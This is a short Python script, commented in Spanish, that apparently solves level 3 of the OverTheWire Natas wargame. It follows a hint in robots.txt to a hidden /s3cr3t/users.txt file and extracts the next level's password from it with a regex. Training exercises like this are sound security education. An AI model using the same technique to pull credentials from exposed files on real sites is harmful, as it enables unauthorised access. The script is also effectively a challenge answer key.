#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:ts=4:sw=4:et:ft=python:
"""
natas03.py

El fichero robots.txt indica el directorio dónde está el fichero users.txt
"""
import sys
import libnatas

# url: "http://natas3.natas.labs.overthewire.org"
# user: "natas3"
password = sys.argv[1]

# si se muestra robots.txt aparece el directorio cerrado a robots
# /s3cr3t/ la password esta en el fichero users.txt
# TODO --> codigo para obtener el fichero 

natas = libnatas.NatasBrowser(level=3, password=password)
soup = natas.get_html_soup(natas.level_url + '/s3cr3t/users.txt')

password_nl = natas.get_password(soup.prettify(), '.*natas4:(.*)\W.*')
natas.print_password(password_nl)
